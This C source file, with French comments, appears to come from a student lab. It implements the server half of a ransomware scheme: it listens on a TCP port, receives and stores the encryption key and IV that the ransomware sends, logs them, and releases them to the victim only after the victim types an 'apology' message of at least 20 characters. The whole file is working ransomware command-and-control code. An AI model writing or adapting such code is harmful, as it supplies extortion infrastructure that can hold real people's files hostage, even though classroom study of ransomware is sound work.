#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdarg.h>

#define PORT 4242
#define KEY_SIZE 32
#define IV_SIZE 16
#define BUFFER_SIZE 1024
#define MIN_APOLOGY_LENGTH 20
#define KEY_FILE "/home/tic/Bureau/TP/encryption_key.bin"

// Définitions pour le système de logs
#define LOG_FILE "/home/tic/Bureau/TP/ransomware_logs.txt"
#define LOG_LEVEL_ERROR   0
#define LOG_LEVEL_WARNING 1
#define LOG_LEVEL_INFO    2
#define LOG_LEVEL_DEBUG   3

// Niveau de log actuel ( à définir selon le besoin )
#define CURRENT_LOG_LEVEL LOG_LEVEL_INFO

// Structure pour stocker la clé et le vecteur d'initialisation
typedef struct {
    unsigned char key[KEY_SIZE];
    unsigned char iv[IV_SIZE];
    int is_set;  // Indicateur si la clé/IV est définie
} CryptoParams;

// Variables globales
CryptoParams crypto_params = {{0}, {0}, 0};

// Fonction pour afficher des données en format hexadécimal
void print_hex(const char *label, const unsigned char *data, size_t len) {
    printf("%s: ", label);
    for (size_t i = 0; i < len; i++) {
        printf("%02x", data[i]);
    }
    printf("\n");
}

// Fonction pour sauvegarder la clé et l'IV dans un fichier
int save_key_iv_to_file() {
    FILE *key_file = fopen(KEY_FILE, "wb");
    if (!key_file) {
        perror("Erreur lors de l'ouverture du fichier pour l'écriture");
        return 0;
    }
    
    size_t written_key = fwrite(crypto_params.key, 1, KEY_SIZE, key_file);
    size_t written_iv = fwrite(crypto_params.iv, 1, IV_SIZE, key_file);
    
    fclose(key_file);
    
    if (written_key != KEY_SIZE || written_iv != IV_SIZE) {
        fprintf(stderr, "Erreur lors de l'écriture dans le fichier\n");
        return 0;
    }
    
    printf("Clé et IV sauvegardés dans %s\n", KEY_FILE);
    return 1;
}

// Fonction pour traiter les connexions clientes
void handle_client(int client_socket) {
    char buffer[BUFFER_SIZE] = {0};
    int valread;
    
    // Lire le mode de fonctionnement (STORE ou RETRIEVE)
    valread = read(client_socket, buffer, BUFFER_SIZE);
    if (valread <= 0) {
        close(client_socket);
        return;
    }
    
    // Mode STORE : le ransomware envoie la clé et l'IV
    if (strncmp(buffer, "STORE", 5) == 0) {
        printf("Mode STORE détecté. Réception de la clé et de l'IV...\n");
        
        // Accuser réception
        char ack[] = "READY";
        send(client_socket, ack, strlen(ack), 0);
        
        // Recevoir la clé
        memset(crypto_params.key, 0, KEY_SIZE);
        int total_received = 0;
        int remaining = KEY_SIZE;
        unsigned char *key_ptr = crypto_params.key;
        
        printf("Réception de la clé (%d octets)...\n", KEY_SIZE);
        while (total_received < KEY_SIZE) {
            int bytes_received = read(client_socket, key_ptr + total_received, remaining);
            if (bytes_received <= 0) {
                perror("Erreur lors de la réception de la clé");
                close(client_socket);
                return;
            }
            total_received += bytes_received;
            remaining -= bytes_received;
        }
        
        // Recevoir l'IV
        memset(crypto_params.iv, 0, IV_SIZE);
        total_received = 0;
        remaining = IV_SIZE;
        unsigned char *iv_ptr = crypto_params.iv;
        
        printf("Réception de l'IV (%d octets)...\n", IV_SIZE);
        while (total_received < IV_SIZE) {
            int bytes_received = read(client_socket, iv_ptr + total_received, remaining);
            if (bytes_received <= 0) {
                perror("Erreur lors de la réception de l'IV");
                close(client_socket);
                return;
            }
            total_received += bytes_received;
            remaining -= bytes_received;
        }
        
        crypto_params.is_set = 1;
        printf("Clé et IV reçus et stockés avec succès.\n");
        
        // Afficher la clé et l'IV en hexadécimal
        print_hex("Clé (HEX)", crypto_params.key, KEY_SIZE);
        print_hex("IV (HEX) ", crypto_params.iv, IV_SIZE);
        
        // Sauvegarder la clé et l'IV dans un fichier
        if (save_key_iv_to_file()) {
            printf("Clé et IV sauvegardés avec succès dans le fichier.\n");
        } else {
            fprintf(stderr, "Erreur lors de la sauvegarde de la clé et de l'IV.\n");
        }
    }
    // Mode RETRIEVE : le client demande la clé et l'IV
    else if (strncmp(buffer, "RETRIEVE", 8) == 0) {
        printf("Mode RETRIEVE détecté. Client demande la clé et l'IV.\n");
        
        // Vérifier si la clé et l'IV sont disponibles
        if (!crypto_params.is_set) {
            char msg[] = "ERROR: Aucune clé n'est disponible pour le moment.";
            send(client_socket, msg, strlen(msg), 0);
            close(client_socket);
            return;
        }
        
        // Demander des excuses
        char prompt[] = "Veuillez entrer un message d'excuse sincère (minimum 20 caractères) :";
        send(client_socket, prompt, strlen(prompt), 0);
        
        // Recevoir les excuses
        memset(buffer, 0, BUFFER_SIZE);
        valread = read(client_socket, buffer, BUFFER_SIZE);
        if (valread <= 0) {
            close(client_socket);
            return;
        }
        
        printf("Message d'excuse reçu : %s\n", buffer);
        
        // Vérifier la longueur du message d'excuse
        if (strlen(buffer) < MIN_APOLOGY_LENGTH) {
            char rejection[] = "REJECTED: Votre message est trop court. Veuillez fournir des excuses plus détaillées.";
            send(client_socket, rejection, strlen(rejection), 0);
        } else {
            // Envoyer l'acceptation et indiquer que la clé est dans le fichier
            char acceptance[] = "ACCEPTED: La clé est disponible dans le fichier encryption_key.bin";
            send(client_socket, acceptance, strlen(acceptance), 0);
            
            // S'assurer que le fichier de clé est à jour
            save_key_iv_to_file();
            
            printf("Excuses acceptées et client informé que la clé est dans le fichier.\n");
        }
    } else {
        char error[] = "ERROR: Mode non reconnu. Utilisez STORE ou RETRIEVE.";
        send(client_socket, error, strlen(error), 0);
    }
    
    close(client_socket);
}

int main() {
    int server_fd, client_socket;
    struct sockaddr_in address;
    int opt = 1;
    int addrlen = sizeof(address);
    
    printf("Démarrage du serveur de pardon...\n");
    
    // Créer le socket
    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0) {
        perror("socket failed");
        exit(EXIT_FAILURE);
    }
    
    // Options du socket
    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt))) {
        perror("setsockopt");
        exit(EXIT_FAILURE);
    }
    
    // Configuration de l'adresse
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(PORT);
    
    // Lier le socket à l'adresse et au port
    if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) < 0) {
        perror("bind failed");
        exit(EXIT_FAILURE);
    }
    
    // Mise en écoute
    if (listen(server_fd, 3) < 0) {
        perror("listen");
        exit(EXIT_FAILURE);
    }
    
    printf("Serveur en écoute sur le port %d...\n", PORT);
    
    // Boucle principale pour accepter les connexions
    while (1) {
        // Accepter une nouvelle connexion
        if ((client_socket = accept(server_fd, (struct sockaddr *)&address, (socklen_t*)&addrlen)) < 0) {
            perror("accept");
            continue;
        }
        
        printf("Nouvelle connexion acceptée\n");
        
        // Traiter la connexion cliente
        handle_client(client_socket);
    }
    
    // Fermer le socket (jamais atteint dans ce cas)
    close(server_fd);
    
    return 0;
}
